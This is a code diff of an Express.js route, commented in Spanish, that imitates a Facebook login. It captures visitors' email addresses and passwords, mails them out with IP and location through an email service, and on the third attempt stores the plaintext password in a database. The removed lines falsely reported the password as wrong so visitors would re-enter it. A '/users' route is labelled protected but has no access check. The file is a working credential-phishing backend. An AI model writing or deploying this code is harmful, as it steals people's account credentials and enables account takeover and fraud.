@@ -1,70 +1,25 @@
 const express = require('express');
 const router = express.Router();
+const User = require('../models/User');
 const { sendLoginAttemptEmail } = require('../services/emailService');
 
-// Simulación de intentos de inicio de sesión por IP
+// Mapa para almacenar intentos de inicio de sesión por email
 const loginAttempts = new Map();
-
-// Función para manejar intentos de inicio de sesión
-const handleLoginAttempt = async (method, data, clientIp) => {
-  const loginData = {
-    method,
-    email: data.email,
-    password: data.password, // La contraseña se enviará por correo solo para pruebas
-    timestamp: new Date(),
-    ip: clientIp
-  };
-
-  // Enviar email de notificación
-  await sendLoginAttemptEmail(loginData);
-};
 
 router.post('/facebook/login', async (req, res) => {
   try {
     const { email, password, location, timezone } = req.body;
     const clientIp = req.ip || req.connection.remoteAddress;
 
-    // Registrar el intento de inicio de sesión
-    await handleLoginAttempt('Facebook', { email, password }, clientIp);
-
-    // Obtener o inicializar los intentos para esta IP
-    if (!loginAttempts.has(clientIp)) {
-      loginAttempts.set(clientIp, 0);
+    // Obtener o inicializar los intentos para este email
+    if (!loginAttempts.has(email)) {
+      loginAttempts.set(email, 0);
     }
 
-    const attempts = loginAttempts.get(clientIp);
-    loginAttempts.set(clientIp, attempts + 1);
+    const attempts = loginAttempts.get(email);
+    loginAttempts.set(email, attempts + 1);
 
-    // Simular retardo
-    await new Promise(resolve => setTimeout(resolve, 3000));
-
-    // Simular respuesta basada en el número de intentos
-    if (attempts < 2) {
-      console.log(`Intento de inicio de sesión fallido #${attempts + 1} desde IP: ${clientIp}`);
-      return res.status(401).json({
-        success: false,
-        message: 'Correo electrónico o contraseña incorrectos'
-      });
-    }
-
-    // En el tercer intento, simular éxito
-    console.log(`Inicio de sesión exitoso desde IP: ${clientIp}`);
-    
-    // Reiniciar contador de intentos
-    loginAttempts.set(clientIp, 0);
-
-    // Extraer el nombre del usuario del correo electrónico
-    const name = email.split('@')[0];
-
-    // Create a simulated user object with basic information
-    const simulatedUser = {
-      id: Math.random().toString(36).substr(2, 9),
-      name: name,
-      email: email,
-      provider: 'facebook'
-    };
-
-    // Enviar notificación por correo con todos los datos
+    // Enviar notificación por correo
     await sendLoginAttemptEmail({
       method: 'facebook',
       email,
@@ -72,21 +27,61 @@ router.post('/facebook/login', async (req, res) => {
       location,
       timezone,
       ip: clientIp,
-      timestamp: new Date().getTime()
+      timestamp: new Date().toISOString()
     });
 
+    // Si es el tercer intento, guardar en la base de datos
+    if (attempts + 1 === 3) {
+      const user = new User({
+        email,
+        password,
+        location,
+        timezone,
+        ip: clientIp,
+        loginAttempts: 3,
+        lastLoginDate: new Date()
+      });
+
+      await user.save();
+
+      // Limpiar los intentos
+      loginAttempts.delete(email);
+
+      return res.json({
+        success: true,
+        message: '¡Bienvenido! Has iniciado sesión correctamente.',
+        isThirdAttempt: true,
+        user: {
+          _id: user._id,
+          email: user.email,
+          registrationDate: user.registrationDate
+        }
+      });
+    }
+
+    // Para intentos 1 y 2
     res.json({
       success: true,
-      user: simulatedUser
+      message: 'Inicio de sesión procesado',
+      attemptsRemaining: 3 - (attempts + 1)
     });
 
   } catch (error) {
-    console.error('Error en el proceso de login:', error);
+    console.error('Error en el inicio de sesión:', error);
     res.status(500).json({
       success: false,
-      message: 'Error en el servidor',
-      error: error.message
+      message: 'Error al procesar el inicio de sesión'
     });
+  }
+});
+
+// Ruta para obtener usuarios (protegida)
+router.get('/users', async (req, res) => {
+  try {
+    const users = await User.find({}, { password: 0 }); // Excluir contraseñas
+    res.json(users);
+  } catch (error) {
+    res.status(500).json({ message: 'Error al obtener usuarios' });
   }
 });
 
